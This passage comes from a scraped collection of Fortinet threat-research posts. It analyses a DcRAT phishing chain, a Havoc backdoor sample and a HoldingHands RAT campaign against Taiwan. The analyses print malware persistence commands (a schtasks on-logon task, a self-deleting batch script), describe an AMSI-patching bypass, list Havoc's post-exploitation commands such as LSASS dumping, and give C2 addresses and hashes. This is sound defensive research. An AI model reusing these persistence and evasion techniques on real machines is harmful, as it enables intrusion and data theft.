the base64 variable: The base64 code in the first variable contained another script: Cleaning the above script reveals the following: This script sets a reversed URL as a variable and points it to an image which contains data hidden with base64. Unfortunately, the URL can’t be reversed and the image payload is no longer available. But due to the presence of the URL, which contains an exe file in base64 and the contents of the code itself, it is safe to assume it would extract the image data and invoke a .NET library to download thethird and final payload from the reversed URL to C:\\Users\\Public\\Downloads: The base64 string in the reversed URL contains the RAT exe file. Looking at the main function, we see multiple calls: It starts with a small delay, and then goes into InitializeSettings, which will decrypt settings encrypted with AES256. The AES256 key is hardcoded and is in base 64: Variables revealed after the decryption: Ports– 8848Hosts- 176.]65.]144.]19Version– 1.0.7Install– falseMTX– DcRatMutex_qwqdanchunPastebin– nullAnti– falseAnti_Process– falseBS_OD– falseGroup– AUHWID– This takes the properties of the machine, concatenates them, converts that into an MD5 hash, and then converts that hash into a hexadecimal string. It then takes the first 20 characters and converts them into upper case. Server signature – iHIVV6dj49xn32TizMB3V5F6bAZIlmMWQuHKEN0CBcWc9Ig0HTq78LVe/AKhThRcQR7wOt/8i61T7NkoN+CPhQ8311QUiU2j4NTTO3B/f3ifVSB2vTGJgrF19iqrqUwK8NKkJnHR+29/ec7pz4lMhwJSOhYYj0ZB9BtUYMUzsic= Server certificate - MIICMDCCAZmgAwIBAgIVAJdJTOcvv+RE0UKkRJdxy6sUSIJ9MA0GCSqGSIb3DQEBDQUAMGQxFTATBgNVBAMMDERjUmF0IFNlcnZlcjETMBEGA1UECwwKcXdxZGFuY2h1bjEcMBoGA1UECgwTRGNSYXQgQnkgcXdxZGFuY2h1bjELMAkGA1UEBwwCU0gxCzAJBgNVBAYTAkNOMB4XDTI0MDYyNjE0MzcyN1oXDTM1MDQwNTE0MzcyN1owEDEOMAwGA1UEAwwFRGNSYXQwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKBWZ41Q3CUr6D9fGM31TTe3ObXCDtWIxyuls5ZxROJrzVNlVm5Mb2zSE/543JczTUE94b3YzFPMUMJJ3SB7vpO7L4lMe0W+JlZClj/00M3J6b7a4bB4/c/BVrO3O5RMGNlMSCy68zX8roxt0SFUdlB2L6JJ2xEuaVv/9bdejAK7AgMBAAGjMjAwMB0GA1UdDgQWBBSKoz4PgqFtf1/VImq3jWW0Pxsu5zAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBDQUAA4GBAIrcEfDtCf8noEqBq9iAkPXXTNhGZ3YgwxGfvgWCAGSrWcEdOs2tWJ4Vx1EgAy6SZ6tJq6soFYOJohwV4S22WVnoQzzPgB759pR36AP0zFjxEhhci0wTHQuP8wRW8oTOCsQxjjHrFFBCqHLTq4Wc59cWbLwuTSBSTgqM0u1iOvO9 After initializing those settings, it runs VerifyHash, which checks if the signature is valid for that hash and public key. Following the main function, if Anti had been TRUE, it would run the following anti analysis function: This runs a query that selects everything from Win32_CacheMemory and iterates through each one. Win32_CacheMemory provides info about cache memory devices. If there are none, it could indicate the presence of a VM. Following the next call, it creates a mutex with the mutex name previously decrypted and saved into MTX. (DcRatMutex_qwqdanchun) If the Anti Process were true, it would run a code that would constantly check for the processes mentioned in it and terminate them if detected: After the next call, if BS_OD (i.e., Blue Screen of Death) was set to true and the user had administrative privileges, the code would attempt to mark the malware process as a critical system process using RtlSetProcessIsCritical. Terminating such a process would trigger a blue screen of death. Following the next call, if In_stall were true, it would run through a few blocks of code under Install(). This code block uses FileInfo to retrieve properties of the Install_Folder variable, which in this case points to the AppData\\Roaming directory. It then obtains the full file path of the currently running malware and compares it to the Install_Folder path. If the paths do not match, it iterates through all running processes and terminates any that are executing from the Install_Folder location. If the user has administrative privileges, the malware spawns a hidden cmd process to execute a base64-decoded command string: /c schtasks /create /f /sc onlogon /rl highest /tn It then appends parameters to register the malware binary as a scheduled task for persistence. The final command executed is: /c schtasks /create /f /sc onlogon /rl highest /tn \"TASK NAME\" /tr \"\\\"FULL PATH OF THE EXECUTABLE\\\"\" & exit If the user lacks administrative privileges, the malware instead creates a registry entry under: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ The entry uses the malware’s filename and path to ensure it is executed at user logon. After completing the previous steps, the malware checks whether the file still exists at the path specified by FullName (i.e., the full path of the currently running executable) and pauses execution for one second. It then creates a new file in the AppData\\Roaming directory and copies the current executable into that location. Next, it generates a .bat file in the AppData\\Local\\Temp directory containing a script designed to execute the dropped file and then delete itself. The contents of the batch file are as follows: @echo offtimeout 3 > NULSTART \"\" \"DROPPED FILE LOCATION\"CD xxx\\AppData\\Local\\Temp\\DEL \"BAT FILE NAME\" /he flags: This function instructs Windows to keep the display on and prevent the system from entering sleep mode, maintaining this state continuously until explicitly reset. It uses the value 2147483651U, which corresponds to 0x80000003 in hexadecimal. According to Microsoft’s documentation for SetThreadExecutionState (a function imported from kernel32.dll), this value is a combination of the following flags: Combined, these flags ensure that the system remains active and the screen remains on without interruption. The RAT then checks to see if the user is an admin. If so, it runs the CleanSetting function: This function performs the following: The RAT then calls for the Amsi.Bypass function The function receives two base64-encoded strings and determines whether the current process is running in 32-bit or 64-bit mode. It then passes this architecture-specific value as a byte to the PatchA function. Inside PatchA, the function decodes two base64 strings: \"amsi.dll\" and \"AmsiScanBuffer\". AmsiScanBuffer is a function provided by the Windows Antimalware Scan Interface (AMSI), available in Windows 10 and later. AMSI allows applications to pass memory buffers to the system’s antivirus engine for scanning. The function proceeds to load amsi.dll into memory and retrieves the address of the AmsiScanBuffer function. It then attempts to inject a patch into this memory location, with the goal of sabotaging or disabling AMSI’s ability to detect malicious code. Finally, the RAT enters an infinite loop, continuously attempting to connect to its command-and-control (C2) server. In this case, the C2 address was hardcoded, as noted earlier. However, the RAT also supports retrieving the C2 address dynamically from a remote URL stored in the Paste_bin variable. The attacker sends a phishing email impersonating a Colombian government agency to deceive the user into executing a malicious file. To evade detection, the attack chain employs multiple obfuscation techniques, including steganography and multi-stage payloads. When the file is run, it downloads an obfuscated VBS script from a text-sharing site. This script, in turn, executes obfuscated PowerShell code that retrieves a second link from another sharing site. It then extracts and invokes a .NET library embedded within an image file using steganography to deliver and execute the final payload. The impact of such an attack is severe: giving a threat actor direct access to a victim’s machine can result in the theft of sensitive data, system compromise, and significant operational or financial damage. FortiMail dynamically detects the email, the BAT file, and the VBS file as malware. FortMail also detects the files statically based on the system’s advanced threat engines and previous threat intelligence research. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Agent.CFQ!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. URLs: hxxp[:]//paste[.]ee/d/jYHEqBJ3/0hxxps[:]//paste[.]ee/d/oAqRiS3ghxxps[:]//ia601205[.]us[.]archive[.]org/26/items/new_image_20250430/new_image[.]jpg ZIP:db21cc64fb7a7ed9075c96600b7e7e7007a0df7cb837189c6551010a6f828590BAT:34b8040d3dad4bd9f34738fbc3363fcda819ac479db8497fb857865cee77ad89VBS:b0f3c7ea17875b5e1545678b3878ce268ff4bde718b66254ce01b0bb864801b8EXE:77a22e30e4cc900379fd4b04c707d2dfd174858c8e1ee3f1cbecd4ece1fab3feC2:176[.]65[.]144[.]19[:]8848 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/dcrat-impersonating-the-columbian-government"
  },
  {
    "title": "Dissecting a Malicious Havoc Sample",
    "content": "FortiGuard Labs Threat Research A Follow-Up to “Intrusion into Middle East Critical National Infrastructure Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the compromised computerSeverity level:High This analysis is a follow-up to the investigation titled ‘Intrusion into Middle East Critical National Infrastructure’(full reporthere), led by the FortiGuard Incident Response Team (FGIR), which investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East. That report revealed that the attacker added several pieces of malware to the system’s Task Scheduler to maintain persistence. In this report, we conduct a detailed analysis of one of the malicious Havoc variant samples. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Havoc is a well-known post-exploitation command and control (C2) backdoor framework, primarily written in C++ and Go. We describe how this Havoc variant is decrypted from a DLL file and then deployed in a newly created “cmd.exe” process, how the Havoc demon communicates with its C2 server, and what malicious actions it can perform on the compromised Windows system. The remote injector (conhost.exe) is launched by the system Task Scheduler using the following command line. C:\\Windows\\System32\\drivers\\conhost.exe -f conhost.dll -ER --ln --path cmd.exe Since the release of Windows 7, Windows OS has included conhost.exe (Console Window Host) to handle the command-line interface. The attacker disguised the remote injector as conhost.exe to mislead the victim. According to our analysis, the remote injector supports multiple features controlled by command-line parameters. The “conhost.dll” passed with the “-f” parameter contains the encrypted Havoc payload, and the “cmd.exe” specified by the “--path” parameter is the target process, into which Havoc will be injected and executed. When the fake conhost.exe is executed without any parameters, it displays its help information (Figure 1), which explains how to use the remote injector and its available options. Once the remote injector starts, it creates a “cmd.exe” process, specified by the “-- path” argument, by calling the API CreateProcessA(), as shown in Figure 2. The remote injector then decrypts a Havoc payload, referred to as the Havoc agent or demon within the Havoc framework, using a piece of shellcode embedded in the conhost.dll file. Figure 3 shows the decryption function in the remote injector, a portion of the decrypted shellcode, and the decrypted Havoc payload in the memory at the bottom of the debugger. The decryption key and IV are generated from the first 30H bytes of the conhost.dll file. Next, the remote injector calls two APIs, ZwAllocateVirtualMemory() and ZwWriteVirtualMemory(), using the ProcessHandle of the newly created “cmd.exe” process to inject the decrypted shellcode and Havoc executable into the process. Finally, the remote injector creates a remote thread by calling the ZwCreateThreadEx() API. The ProcessHandle parameter is again set to the newly created “cmd.exe” process, and its lpStartAddress parameter points to the address of the injected shellcode within the process. The purpose of shellcode is to deploy the subsequent Havoc payload (a DLL file) into the “cmd.exe” process and execute it. Havoc Framework is a typical RAT (Remote Access Trojan) and an open-source project available on GitHub. The Framework is written in multiple languages, including Golang, C, C++, Qt, Python, and Assembly (ASM). It was developed byC5piderand released in 2022. In Havoc, the Command and Control (C2) server is referred to as teamserver, while its UI dashboard, used to interact with teamserver, is referred to as the client. The Havoc agent, also known as a demon, runs on the compromised device to receive commands from the C2 server, allowing it to control the system. Figure 4 shows the Havoc client on the server side, where a demon is actively being connected and controlled. Havoc supports HTTP, HTTPS, and SMB protocols to transport commands and results between the C2 server and the compromised devices. In this sample, the C2 server is hardcoded as “apps[.]gist[.]githubapp[.]net.” Unfortunately, the server was unavailable during our analysis. To proceed with our analysis, we set up a simulated Command and Control (C2) server. We modified the protocol from HTTPS to HTTP, allowing the traffic to be captured and analyzed in plaintext without TLS encryption. As long as the Havoc demon is running on the compromised device, it collects metadata about both the compromised Windows system and the Havoc process itself. This metadata is encrypted using the AES algorithm and then sent to the C2 server to register the compromised system on the C2 server. As shown at the bottom of Figure 5, the collected metadata includes various system and process details. The metadata (size:0xBA) contains, but is not limited to, the following information: the agent ID (0x67C54600), Demon ID (0x0F), Host name, User name, Doman, IP address, process name (“C:\\Windows\\SYSTEM32\\cmd.exe”), process ID (0x1ED4), parent PID (0x2444), the process’s load base address, OS version information, OS architecture, and more. Figure 6 shows a demon-init packet containing the AES-encrypted metadata mentioned earlier. This packet must be sent as the first packet to the C2 server to register the victim’s system. We have divided the packet into color-coded sections and broken it down in the table below to explain the contents of each part. Offset Comments +00h The data size, 0xFA. +04h Magic value, 0xDEADBEEF. +08h Agent ID, 0x67C54600. +0Ch Command ID, 0x63. DEMON_INIT. +10h Request ID, 0x0. +14h AES Key, 20h bytes. +34h AES IV, 10h bytes. +44h The AES encrypted metadata. The demon-init packet is sent as the body of an HTTP POST request. When the C2 server receives the packet, it verifies the magic value and decrypts the metadata using the AES key and AES IV included in the packet to complete the registration process. Meanwhile, the demon appears on the client dashboard with the compromised system metadata, just as illustrated in Figure 4. Figure 7 shows a Wireshark screenshot capturing a demon-init packet sent via an HTTP Post request. Havoc defines a wide range of control commands to control the compromised system, listed below: COMMAND_GET_JOB(0x1) COMMAND_INLINEEXECUTE_EXCEPTION(0x1) COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND(0x2) COMMAND_INLINEEXECUTE_RAN_OK(0x3) COMMAND_INLINEEXECUTE_COULD_NO_RUN(0x4) COMMAND_INLINEEXECUTE(0x14) COMMAND_NOJOB(0xA) COMMAND_SLEEP(0xB) COMMAND_PROC_LIST(0xC) COMMAND_FS(0xF) COMMAND_JOB(0x15) COMMAND_INJECT_DLL(0x16) COMMAND_INJECT_SHELLCODE(0x18) COMMAND_SPAWNDLL(0x1A) COMMAND_PROC_PPIDSPOOF(0x1B) CALLBACK_OUTPUT(0x0) CALLBACK_FILE(0x2) CALLBACK_FILE_WRITE(0x8) CALLBACK_FILE_CLOSE(0x9) CALLBACK_ERROR(0xD) CALLBACK_OUTPUT_OEM(0x1E) CALLBACK_OUTPUT_UTF8(0x20) DEMON_INIT(0x63) DEMON_INFO(0x59) BEACON_OUTPUT(0x5E) COMMAND_TOKEN(0x28) COMMAND_OUTPUT(0x5A) COMMAND_ERROR(0x5B) COMMAND_EXIT(0x5C) COMMAND_KILL_DATE(0x5D) COMMAND_CHECKIN(0x64) COMMAND_EXCEPTION(0x98) COMMAND_SYMBOL_NOT_FOUND(0x99) COMMAND_NET(0x834) COMMAND_CONFIG(0x9C4) COMMAND_SCREENSHOT(0x9CE) COMMAND_PIVOT(0x9D8) COMMAND_TRANSFER(0x9E2) COMMAND_SOCKET(0x9EC) COMMAND_KERBEROS(0x9F6) COMMAND_MEM_FILE(0xA00) COMMAND_PACKAGE_DROPPED(0xA0A) COMMAND_PROC(0x1010) COMMAND_PS_IMPORT(0x1011) COMMAND_ASSEMBLY_INLINE_EXECUTE(0x2001) COMMAND_ASSEMBLY_LIST_VERSIONS(0x2003) Most of the commands come with sub-commands to extend their capabilities. For example, theCOMMAND_FS(0xF)has 10 sub-commands: DEMON_COMMAND_FS_DIR(1) DEMON_COMMAND_FS_DOWNLOAD(2) DEMON_COMMAND_FS_UPLOAD(3) DEMON_COMMAND_FS_CD(4) DEMON_COMMAND_FS_REMOVE(5) DEMON_COMMAND_FS_MKDIR(6) DEMON_COMMAND_FS_COPY(7) DEMON_COMMAND_FS_MOVE(8) DEMON_COMMAND_FS_GET_PWD(9) DEMON_COMMAND_FS_CAT(10) Suppose the attacker needs to create a folder named “test” on the compromised system. The packet shown in Figure 8 can be observed: 0x0F is the command ID for DEMON_COMMAND_FS, and 0xA18D02EC is the request ID. The following value indicates the size of the encrypted sub-command and parameters. Within the decrypted sub-command data, 0x06 is the ID for DEMON_COMMAND_FS_MKDIR, and the subsequent data represents the folder name (size + data). In addition to the command and subcommand approach, Havoc also supports the in-memory execution of object files, commonly known as BOFs (Beacon Object Files). The C2 server sends a compiled Object File containing a piece of binary shellcode, which is executed directly in the memory of the demon process on the compromised system. Using BOFs allows Havoc to extend its functionality without replacing or updating the demon itself. Figure 8 shows a recently decrypted object file carried in a packet for the COMMAND_MEM_FILE command (command ID: 0xA00). The packet was sent when we typed “enum_filter_driver” in the client UI. In addition to the control commands, sub-commands, and BOFs introduced earlier, Havoc also implements a wide range of features. These features are categorized into two types: command and module, with each module containing multiple commands. Once we type a command name or a module name followed by its command name, the C2 server generates a command packet with the corresponding command ID and sub-command ID or BOF, which is then sent to the demon to control the compromised system. All the features of Havoc are listed in the table below. Command Name Type Description adcs_enum Command Enumerate CAs and templates in the AD. adcs_request Command Request an enrollment certificate. adduser Command Add a new user to a machine. addusertogroup Command Add a user to the specified group. arp Command Lists out ARP table. bofbelt Command A Seatbelt port using BOFs (Beacon Object Files). cacls Command List user permissions for the specified file. cat Command Display content of the specified file. cd Command Change to a specified directory. checkin Command Request a checkin request. config Module Configure the behavior of the demon session. cp Command Copy file. dcenum Command Enumerate domain information. dir Command List directory. dll Module DLL spawn and injection modules. domainenum Command Lists users accounts in the current domain. dotnet Module Execute and manage dotnet assemblies. download Command Downloads a specified file. driversigs Command Checks drivers for known EDR vendor names. enableuser Command Activates the specified user account. enum_filter_driver Command Enumerate filter drivers. enumlocalsessions Command Enumerate currently attached user sessions. env Command Print environment variables. exit Command Cleanup and exit. get-asrep Command Enumerate a given domain for user accounts with ASREP. get-delegation Command Enumerate a given domain for different types of abusable Kerberos Delegation settings. get-netsession Command Enumerate sessions on the remote device. get-spns Command Enumerate a given domain for user accounts with SPNs. get_password_policy Command Gets a server's configured password policy. help Command Shows help message of specified command. inline-execute Command Executes an object file. ipconfig Command Display network configuration settings . job Module Job manager. jump-exec Module Lateral movement module. kerberoast Command Perform Kerberoasting against specified SPN. klist Command List Kerberos tickets. ldapsearch Command Execute LDAP searches. listdns Command Obtains DNS cache entries. locale Command Prints the locale information of the server. luid Command Get current logon ID. mkdir Command Create new directory. mv Command Move a file or folder. nanodump Command Dump the LSASS process. nanodump_ppl_dump Command Bypass PPL and dump LSASS. nanodump_ppl_medic Command Bypass PPL and dump LSASS. nanodump_ssp Command Load a Security Support Provider (SSP) into LSASS. net Module Network and host enumeration module. netGroupList Command List groups. netGroupListMembers Command List group members. netLclGrpLstMmbrs Command List local group members. netLocalGroupList Command List local group. netshares Command List shared folders. netsharesAdmin Command List details of the shared folders. netstat Command List listening and connected network connections. netuptime Command Obtains the boot time information. netuser Command Get information about specific user. netview Command Lists the workstations and servers. noconsolation Command Execute a PE inline. nslookup Command Make a DNS query on the compromised device . pivot Module Pivoting module. powerpick Command Executes unmanaged powershell commands. powershell Command Executes powershell.exe commands. proc Module Process enumeration and management. ptt Command Import Kerberos ticket into a logon session. purge Command Purge a Kerberos ticket. pwd Command Get current directory. quser Command Simple implementation of quser.exe. reg_delete Command Deletes the registry key or value. reg_query Command Query a registry value or enumerate a single key. reg_query_recursive Command Recursively enumerate a key. reg_save Command Saves the registry path and all subkeys to a file. reg_set Command Creates or sets the specified key or value. remove Command Remove file or directory. resources Command List information of memory and disk drive. routeprint Command Prints route information. rportfwd Module Reverse port forwarding. samdump Command Dumps the SAM, SECURITY and SYSTEM registries to files. sc_create Command Creates a service on the target device. sc_delete Command Deletes the specified service. sc_description Command Sets the description of an existing service. sc_enum Command Enumerate services. sc_qc Command Queries a service with name in BOF (Beacon Object Files). sc_qdescription Command Queries a services description sc_qfailure Command Query a service for failure conditions. sc_qtriggerinfo Command Query a service for trigger conditions. sc_query Command Query services in BOF (Beacon Object Files). sc_start Command Starts a specified service. sc_stop Command Stops a specified service. schtasksenum Command Enumerate scheduled tasks. schtasksquery Command Query the given task in scheduled tasks. screenshot Command Takes a screenshot. sessions Command Get logon sessions. setuserpass Command Sets the password to a specified user account. shell Command Executes Windows commands in cmd.exe. shellcode Module Shellcode injection techniques. sleep Command Sets the delay to sleep. socks Module Manages socks5 proxy. task Module Task manager. tasklist Command List running processes on the remote device. tgtdeleg Command Retrieve a usable TGT for the current user. token Module Token manipulation and impersonation. transfer Command Download transfer module. upload Command Uploads a file. uptime Command Lists system boot time. userenum Command Lists user accounts. whoami Command Get the login user information in BOF (Beacon Object Files). windowlist Command List visible windows, like program windows’ title. wmi_query Command Run a wmi query and display results in CSV format. Here is how a control command is packaged into a packet. Acting as an attacker, we entered the “pwd” command inside the Havoc C2 server and sent it to the demon, which then displayed the command result on our screen. Typically, once the demon has connected to the C2 server, it sends a heartbeat packet to the C2 server approximately every 3 seconds (a random number) to notify the C2 server that the demon is still alive. The heartbeat packet structure is shown in Figure 10. Figure 10 also shows the command packet for the “pwd” command generated by the C2 server at the bottom. The control command data is sent within the response to the heartbeat packet. The command packet begins with a command ID (0x0F for COMMAND_FS), followed by a request ID (0xc5312b04), the size of the encrypted data, and then the encrypted data itself. The encrypted data, “51 7c 66 9c,” decrypts to “00 00 00 09,” which is the sub-command ID 0x9 (for DEMON_COMMAND_FS_GET_PWD) under the command ID 0x0F (COMMAND_FS). This analysis provides a detailed examination of a Havoc variant involved in a long-term cyber intrusion targeting critical national infrastructure in the Middle East. It demonstrates how this remote injector leverages a disguised conhost.exe process to deploy the Havoc payload into a newly created cmd.exe process. The Havoc framework’s modular design, supporting commands, sub-commands, and in-memory execution of Beacon Object Files (BOFs), offers attackers a flexible method to control the remote demon process. Overall, understanding the packet structures, encryption mechanisms, and command execution workflows will help researchers detect and analyze this sophisticated RAT framework. Fortinet customers are already protected from this malware with AntiVirus service, FortiGuard’s Anti-Botnet service, FortiGuard’s AntiSPAM service, and FortiGuard’s Web Filtering service as follows: TheFortiGuard’s Anti-Botnet serviceblocks the DNS requests for the C2 server domain. The domain to the C2 server is rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiGuard Antivirus servicedetects the remote injector and the encrypted Havoc DLL file with the following AV signatures. W64/Havoc.d16b!trData/Havoc.e5b0!tr FortiGuard IPS servicedetects Havoc traffic with the signature “Backdoor.Havoc.Agent”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. We also suggest that our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. apps[.]gist[.]githubapp[.]net [conhost.exe / the remote injector]22BD09FBAB54963D4B0234585D33571A47A2DF569DBAB8B40988415AB0A3C37B[conhost.dll / encrypted Havoc sample with shellcode]9208034AF160357C99B45564FF54570B1510BAF3BC033999AE4281482617FF5B FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/dissecting-a-malicious-havoc-sample"
  },
  {
    "title": "Threat Group Targets Companies in Taiwan",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High In January 2025, FortiGuard Labs observed an attack targeting users in Taiwan. The threat actor is spreading the malware known as winos 4.0 via an email masquerading as being from Taiwan's National Taxation Bureau. Through continued monitoring, we identified further malware samples associated with this campaign. Among the new samples, a phishing email was sent in March 2025 with an attachment that contained a link used in another attack campaign. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first link belongs to the domain twszz[.]xin, which follows a similar naming pattern to the campaign targeting users in Taiwan. The second link directs to an image file about tax inspection, while the HTML filename claims to include account statement details. This link enabled us to trace the attack and identify additional malware samples, along with further links. Figure 2 provides a simplified threat map. The files on the left side of Figure 2 are XLS files used in campaigns that took place in June 2024. Over the past few months, this threat group has deployed malware based on the HoldingHands RAT (Remote Access Trojan), also known as Gh0stBins, to compromise users in Taiwan. The malware typically comprises multiple files embedded within a ZIP file and is distributed via phishing emails. Phishing emails typically masquerade as messages from the government or business partners, using topics such as taxes, pensions, invoices, and other subjects that prompt the recipient to immediately click on or open an attachment. Sometimes, the email content can be a picture with a hyperlink that asks the recipient to click on it, inadvertently downloading the malware. The attached PDF file uses content related to the phishing email to trick the recipient into opening the link. In newer attack chains, the link leads to a download page. The malware download page looks much simpler than the PDF file and email. It only contains text and a download button. In some attack chains, the malware is embedded in a password-protected ZIP file, and the password is on the download page. This prevents analysts who get the ZIP file but don't have access to the download page from opening it. Multiple files are used during the attack, including legitimate executable files and necessary DLL files, encrypted shellcode, and shellcode loaders. The shellcode loaders, which decrypt and execute the encrypted shellcode, are DLL files loaded by a legitimate executable via side-loading. Figure 8 shows an example of the files embedded in the ZIP file and the execution flow.條例檔案is the legitimate executable file used to loaddokan2.dllvia side-loading. In addition to the main execution flow, encrypted shellcodes support persistence, and empty files provide unique filenames. Although the ZIP files downloaded from different PDF files and webpages may have varying folder structures and files, their execution flows are similar to those shown in Figure 8. Sometimes, the ZIP file only contains an executable that drops the duplicate files observed in other chains. According to the image debug directory of the executable file, the malware is based on the HoldingHands Remote Access Trojan (RAT). Over the past two months, the ZIP file has included a text file containing the passwords for other files in the ZIP file, which makes detection more difficult. Dokan2.dll creates a thread to decrypt data indxpi.txtand execute it. Before this, it calls theShowWindowfunction to hide the executable's window for side-loading. It then searches forkernel32.dllandDwhsOqnbdrr.dllby comparing the lengths of the filenames of the files extracted from the ZIP file. DwhsOqnbdrr.dllis an empty file. By shifting each letter in the filename “DwhsOqnbdrr”forward one position in the alphabet, it becomesExitProcessand loads the function from thekernel32.dllit just found. It replaces the address of theExitProcessfunction in the import table with the address of a function that calls theWaitForSingleObjectfunction to wait for a signal from the thread that decryptsdxpi.txt. When the thread finishes, it calls theExitProcessfunction that it just loaded. In the thread, it executesthe條例檔案as an administrator if it doesn’t have high enough privileges. Then it searches forcollalautriv.xmland converts the filename to getVirtualAlloc, the API used in decryption. dxpi.txtexecutes initial setups for the next stage, including anti-VM, privilege escalation, and installation. Subkey: SOFTWARE\\MsUpTas Value name: State Value: 1 In addition, it drops other files extracted from the ZIP file to C:\\Program Files (x86)\\WindowsPowerShell\\Update. Original filename After Filename of dropped file Description bkproc.dll TaskServer.exe The same file as the條例檔案. code.dll code.bin It’s copied as System32\\msvchost.dat. Db.dll msgDb.dat The malicious payload. Shellcode based on HoldingHands. Doport.dll dokan2.dll Shellcode loader formsgDb.dat. EGLProtect.dll libEGL.dll The legitimate DLL file for條例檔案. fig32.dll config32.bin Unused. It renames the legitimateversion.dllasconfVersion.dlland writes the decrypted data ofconfig32.binto SysWOW64\\version.dllif it’s used. fig64.dll config64.bin It renames the legitimateTimeBrokerClient.dllasBrokerClientCallback.dlland writes the decrypted data ofconfig64.bintoTimeBrokerClient.dll. simg32.dll simg64.dll Binary file that is used bymsvchost.dat. In addition, it terminates ifBrokerClientCallback.dllandBlend.dllare present, indicating that the computer is infected.Blend.dllis thelegitimatemsimg32.dllthat is later renamed bymsvchost.dat. After installation, it executesTaskServer.exe, which loadsdokan2.dllvia side-loading. Dokan2.dllthendecrypts and executes the shellcode inmsgDb.datfor the next stage. Original Filename Filename of dropped file Description msgDb.dat system.dat, mymsc.nls The malicious payload. dokan2.dll dokan2.dll Shellcode loader formsgDb.dat. libEGL.dll libEGL.dll The legitimate DLL file for條例檔案. TaskServer.exe taskyhost.exe The same file as the條例檔案. simg64.dll msimg32.dll Shellcode loader forsystem.dat. MsgDb.datimplements C2 tasks for setting registry keys, data collection, and module download from the HoldingHands RAT. It also sends heartbeat packets to ensure the connection is active. Below is the packet's data structure, excluding the header. The packets frommsgDb.datand the C2 server follow this structure. 0 1 2 3 4 5 6 7 8 9 A B C D E F 0 Magic Data size Unused Command 1 Payload(optional) ⁞ ⁞ Magic: 0xDEADBEEFData size: The size of the command and the payload The first outgoing packet doesn’t contain a payload. TheKNELcommand indicates that the packet is from a kernel module. As a response, the C2 server sends a data collection request. After sending the user information,msgDb.datsends heartbeat packets and waits for further instructions. The response command is 0x00. To get the install date, it reads theInstallDatevalue from the SOFTWARE\\HHClient registry key. If this is the first time the C2 server queries for this information, it writes the current time to the value. The registry values set by other commands areCommentandGroupfrom the SOFTWARE\\HHClient registry key. If theCommentvalue is not set, it writesdefaultto the packet. Once all data is downloaded,msgDb.datexecutes the module. Otherwise, it sends 0x0B to ask for more data. During our analysis, we identified three modules delivered by the C2 server, including two remote desktop modules and a file manager.msgDb.datcalls the only export function, ModuleEntry, to proceed to the next stage of the attack. Below are the commands in the initial packet: Module name Command Description rd RDTP Remote desktop rd_dxgi RDTP Remote desktop filemgr FMGR File manager The packets follow the same structure asmsgDb.dat. The modules' image debug directories indicate that they also belong to the HoldingHands RAT. Some modules appear to be simplified versions, as indicated by the term 'jingjianban' (meaning 'lite version' in Chinese) in the Image Debug Directory. In addition towinos, which we covered in February 2025, and HoldingHands, discussed in this article, this threat group frequently employs Gh0stCringe. Figures 5 through 7 include screenshots of files in this attack chain. This analysis revealed further malware samples associated with the attack that began targeting Taiwan in January 2025. The attack chain comprises numerous snippets of shellcode and loaders, making the attack flow complex. However, the purpose of these samples is to execute a malicious payload that accesses a C2 server to receive further instructions. Across winos, HoldingHands, and Gh0stCring, this threat group continuously evolves its malware and distribution strategies. FortiGuard will continue to monitor these attack campaigns and provide appropriate protections as required. The malware described in this report is detected and blocked byFortiGuard Antivirusas: PDF/Agent.A6DC!tr.dldrW64/ShellcodeRunner.ARG!trW64/Agent.FIN!trW64/HHAgent.BEE8!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have installed the latest updates for these products are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm malicious macros in documents. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 